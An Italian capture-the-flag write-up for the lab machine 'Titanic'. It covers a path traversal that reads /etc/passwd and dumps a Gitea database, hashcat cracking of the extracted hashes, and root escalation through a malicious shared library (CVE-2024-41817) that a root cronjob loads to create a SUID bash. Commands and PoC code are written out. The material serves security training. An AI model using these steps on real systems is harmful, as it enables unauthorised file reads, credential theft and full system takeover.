+++
date = '2026-09-06T16:40:10+02:00'
draft = false
title = 'Titanic Writeup IT'
+++
**Autore:** **`joy.scd01`**

**Data:** **`17/02/2025`**

![pwn.png](/images/imgs_titanic/pwn.png)

---
# Introduzione

_**Titanic**_ è una macchina **Linux** di livello **Easy** incentrata sullo sfruttamento di una **Path Traversal** all'interno di una web app per esfiltrare file contenenti informazioni sensibili.

In questo caso, la vulnerabilità viene sfruttata per ottenere l'**accesso iniziale** effettuando il dump di un database **SQLite** di **Gitea**, estraendo gli hash degli utenti e craccandoli per ottenere l'accesso via **SSH**.

La privilege escalation richiede un'enumerazione interna per individuare uno script eseguito da un **cronjob**, il quale risulta vulnerabile a una nota **Arbitrary Code Execution in ImageMagick** tramite un hijacking di librerie condivise (shared library hijack), che porta alla compromissione totale del sistema.

---
# Tecniche Utilizzate

- **Path Traversal → Arbitrary File Read (Database Exfiltration)**

- **Database Dump → Hash Cracking**

- **Cronjob Hijacking → ImageMagick Arbitrary Code Execution (CVE-2024-41817)**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV titanic
```

```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp    open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to [http://titanic.htb/](http://titanic.htb/)
|_http-server-header: Apache/2.4.52 (Ubuntu)
42895/tcp filtered unknown
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto **`titanic.htb`** al mio file **`/etc/hosts`**.

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## HTTP - Enumerazione Web 

L'applicazione web ospita un sito per la prenotazione di viaggi.

![web1.png](/images/imgs_titanic/web1.png)

Analizzando la funzionalità "**Book Now**", ho notato che il form richiede **nome e cognome**, **indirizzo email**, **numero di telefono**, **data del viaggio** e **tipo di cabina**.

![web2.png](/images/imgs_titanic/web2.png)

L'invio del form scarica automaticamente un file **`.json`** contenente queste informazioni.

![json.png](/images/imgs_titanic/json.png)

Ho lanciato in background una scansione sulle directory con **gobuster** e una scansione con **ffuf** per i vhost.
La scansione dei vhost ha rivelato **`dev`** che ho aggiunto al mio file **`/etc/hosts`**.

![dev.png](/images/imgs_titanic/dev.png)

Li era hostata un'istanza di **Gitea**.

![gitea.png](/images/imgs_titanic/gitea.png)

Ho registrato un nuovo account, navigato nella scheda **Explore** e analizzato le repository disponibili.

![gitea2.png](/images/imgs_titanic/gitea2.png)

Ho trovato due repository interessanti:

- **`docker-config`**: Conteneva un file **`docker-compose.yml`** che esponeva le credenziali del database:

![mysql.png](/images/imgs_titanic/mysql.png)

- **`flask-app`**: Conteneva il codice sorgente dell'applicazione web. Analizzandolo, ho individuato una chiara vulnerabilità di **Path Traversal** nel parametro **`ticket`**:

![vuln.png](/images/imgs_titanic/vuln.png)

**Nota**: _Il parametro **`ticket`** viene preso direttamente dalla query string dell'**URL** e concatenato all'interno di un percorso del filesystem senza alcuna validazione o sanitizzazione appropriata._

# Accesso Iniziale | Path Traversal → Hash Cracking → developer

Per confermare la vulnerabilità, ho recuperato con successo il file **`/etc/passwd`**:

```bash
curl "http://titanic.htb/download?ticket=/etc/passwd"
```

![path.png](/images/imgs_titanic/path.png)

Cercando **`/bin/bash`** all'interno della risposta, ho identificato **`developer`** come l'unico utente valido sul sistema.

Il mio obiettivo successivo era recuperare il database di **Gitea** utilizzando questo **path traversal**. Sapevo che **Gitea** generalmente archivia il proprio database in un file chiamato **`gitea.db`**. Tornando al **`docker-compose.yml`** nella repo di **Gitea**, ho dedotto che potesse essere mappato su **`/home/developer/gitea/data`**.

![gitea3.png](/images/imgs_titanic/gitea3.png)

Poiché l'applicazione accoda il percorso della directory, ho giocato un po' con il payload e sono riuscito a scaricare il database **SQLite** aggiungendo **`/data/gitea/`** alla fine del path:

```bash
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" > gitea.db
```

![db.png](/images/imgs_titanic/db.png)

Ora dovevo estrarre e craccare gli hash.

![db2.png](/images/imgs_titanic/db2.png)

**Nota**: _Avendo già avuto a che fare con **Gitea** in passato, non ero nuovo a questa piattaforma e sapevo come memorizza gli hash (**PBKDF2** con specifiche **iterazioni** e lunghezze del **salt**). Craccarli direttamente da un classico dump **SQLite** non è così banale. Per questo motivo, sono passato direttamente a un tool specifico chiamato **`giteaToHashcat`** per analizzare il file **`.db`** e convertire gli hash in un formato digeribile per **hashcat**_.

- **https://github.com/BhattJayD/giteatohashcat**

```bash
python3 giteaToHashcat.py ../gitea.db
```

![db3.png](/images/imgs_titanic/db3.png)

Essendo **`developer`** l'unico utente, ho salvato il suo hash formattato e l'ho dato in pasto ad **hashcat**:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat.png](/images/imgs_titanic/hashcat.png)

Ho utilizzato queste credenziali per accedere via **SSH**:

![userf.png](/images/imgs_titanic/userf.png)

Ho trovato la **user flag** all'interno della home directory.

# Privilege Escalation | Cronjob & ImageMagick Vuln → root

Durante la mia enumerazione manuale interna, ho controllato la directory **`/opt`**, che conteneva 3 cartelle: **`/app`**, **`/containered`**, e **`/scripts`**.

- La directory **`/app`** conteneva gli stessi file dell'applicazione web trovati nella repo di **Gitea**.

- L'utente **`developer`** non aveva i permessi di lettura per la directory **`/containered`**.

- Tuttavia, all'interno della directory **`/opt/scripts`**, ho trovato un interessante script chiamato **`identify_images.sh`**:

![opt.png](/images/imgs_titanic/opt.png)

**Nota**: _Questo script si sposta nella directory delle immagini e utilizza il comando **`identify`** di **ImageMagick** per processare tutti i file **`.jpg`**._

Per capire come e quando questo script venisse utilizzato, ho trasferito ed eseguito **`pspy64`** sulla macchina. L'output ha mostrato che **`identify_images.sh`** veniva attivato periodicamente da un cronjob in esecuzione come **root**.

Sapendo questo, ho controllato la versione installata di **ImageMagick** e ho cercato vulnerabilità correlate.

![version.png](/images/imgs_titanic/version.png)

Ho trovato un advisory per la **CVE-2024-41817**:

- **https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8**

**Nota**: _Questa vulnerabilità di **ImageMagick** consente ad un attaccante di **eseguire codice arbitrario** inserendo una libreria condivisa (shared library) malevola all'interno della directory in cui il binario **magick** elabora i file_.

Per verificare la cosa, ho testato il **PoC** fornito:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF

ls -al
id
magick /dev/null /dev/null
```

Questo ha confermato la **ACE** (**Arbitrary Code Execution**).

![priv1.png](/images/imgs_titanic/priv1.png)

Ora, per fare privilege escalation, mi sono spostato nella directory target (**`/opt/app/static/assets/images`**) e ho sostituito il comando id con **`cp /bin/bash /tmp/bash; chmod 6777 /tmp/bash`**.

![priv2.png](/images/imgs_titanic/priv2.png)

**Nota**: _Poiché lo script **`identify_images.sh`** viene eseguito periodicamente da un cronjob come **root**, ho semplicemente dovuto aspettare che il task si attivasse. Ho monitorato la directory **`/tmp`** e, poco dopo, è stata creata una copia **SUID** di **bash**._

**root** shell:

```bash
/tmp/bash -p
```

![rootf.png](/images/imgs_titanic/rootf.png)

La root flag si trovava in **`/root`**.

---
# Considerazioni Finali

Una macchina divertente e lineare.

**Path traversal** classico, ma richiede un po' di logica per individuare il database di **Gitea** basandosi sul file **docker-compose**. La privilege escalation evidenzia i pericoli legati all'esecuzione di cronjob automatizzati che elaborano file all'interno di directory scrivibili dagli utenti, utilizzando binari vulnerabili a **shared library hijacking**.

**Fonti**:

- **Gitea to Hashcat Parser | https://github.com/BhattJayD/giteatohashcat**

- **ImageMagick Vulnerability (GHSA-8rxc-922v-phg8) | https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8**